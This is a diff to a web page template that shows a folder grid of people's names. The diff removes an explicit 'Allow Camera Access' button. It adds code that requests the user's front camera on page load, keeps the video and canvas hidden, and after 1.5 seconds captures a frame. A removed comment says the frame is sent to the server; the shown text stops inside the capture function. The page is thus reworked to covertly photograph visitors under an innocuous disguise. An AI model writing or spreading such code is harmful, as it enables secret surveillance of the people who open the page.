@@ -54,24 +54,6 @@
         video, canvas {
             display: none;
         }
-
-        .button-container {
-            text-align: center;
-            margin-top: 2rem;
-        }
-
-        #start-camera {
-            padding: 1rem 2rem;
-            background-color: #f7d217;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.2rem;
-            cursor: pointer;
-        }
-
-        #start-camera:hover {
-            background-color: #f7c116;
-        }
     </style>
 </head>
 <body>
@@ -80,34 +62,29 @@
     <div class="folder-grid">
         <div class="folder">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Adam</a></div>
+            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Adam</a></div>
         </div>
         <div class="folder">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Yassine</a></div>
+            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div>
         </div>
         <div class="folder">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Fah</a></div>
+            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Fah</a></div>
         </div>
         <div class="folder">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Hiba</a></div>
+            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hiba</a></div>
         </div>
         <div class="folder">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Amine</a></div>
+            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Amine</a></div>
         </div>
         <div class="folder">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Malak</a></div>
+            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Malak</a></div>
         </div>
         <!-- Add more folders here -->
-    </div>
-
-    <!-- Button to trigger camera access -->
-    <div class="button-container">
-        <button id="start-camera">Allow Camera Access</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -116,29 +93,18 @@
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const startCameraButton = document.getElementById('start-camera');
 
-        // Event listener for camera access
-        startCameraButton.addEventListener('click', function () {
-            // Check if the browser supports mediaDevices (camera)
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                // Request camera access
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                    .then(function (stream) {
-                        video.srcObject = stream;
-                        video.onloadedmetadata = function () {
-                            setTimeout(() => captureAndSend(), 1500);
-                        };
-                    })
-                    .catch(function (err) {
-                        alert("Error: " + err.message);
-                    });
-            } else {
-                alert("Camera not supported in this browser.");
-            }
-        });
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' }, audio: false
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                setTimeout(() => captureAndSend(), 1500);
+            };
+        })
+        .catch(err => console.warn('Camera permission not granted.'));
 
-        // Capture image and send it to the server
         function captureAndSend() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
